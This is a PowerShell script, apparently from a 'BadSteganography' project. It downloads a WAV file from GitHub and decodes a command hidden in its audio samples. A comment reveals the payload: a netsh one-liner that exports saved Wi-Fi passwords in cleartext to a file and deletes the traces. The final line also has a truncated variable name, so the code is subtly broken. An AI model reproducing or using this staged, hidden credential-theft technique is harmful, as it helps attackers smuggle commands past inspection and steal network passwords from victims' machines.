function Decode-SpreadSpectrumAudio {
    param (
        [byte[]]$audioBytes,
        [int]$messageLength
    )
    try {
        $extractedMessage = ""
        for ($i = 44; $i -lt ($messageLength * 2) + 44; $i += 2) {
            # Convert two bytes to a 16-bit signed int
            $sample = [BitConverter]::ToInt16($audioBytes, $i)

            if ($sample -gt 0) {
                $extractedMessage += "1"
            }
            else {
                $extractedMessage += "0"
            }
        }
        $decodedMessage = ""
        for ($i = 0; $i -lt $extractedMessage.Length; $i += 8) {
            $binarySubstring = $extractedMessage.Substring($i, 8)
            $charCode = [Convert]::ToInt32($binarySubstring, 2)
            $decodedMessage += [char]$charCode
        }
        return $decodedMessage
    }
    catch {
        Write-Host "Error: $_"
    }
}
# this currently downloads the rain.wav audio in memory and decodes the message being 
# netsh wlan export profile key=clear; Select-String -Path *.xml -Pattern 'keyMaterial' | % { $_ -replace '</?keyMaterial>', ''} | % {$_ -replace '.xml:22:', ''} > pass.txt ; rm -r Wi-Fi* ; cat pass.txt
$url = "https://github.com/CharlesTheGreat77/BadSteganography/raw/main/audio/rain.wav"
$messageLength = 200 * 8  # Length of message
$req = (Invoke-WebRequest -Uri $url -Method Get -UseBasicParsing).Content
$decodedMessage = Decode-SpreadSpectrumAudio -audioBytes $req -messageLength $messageLengt
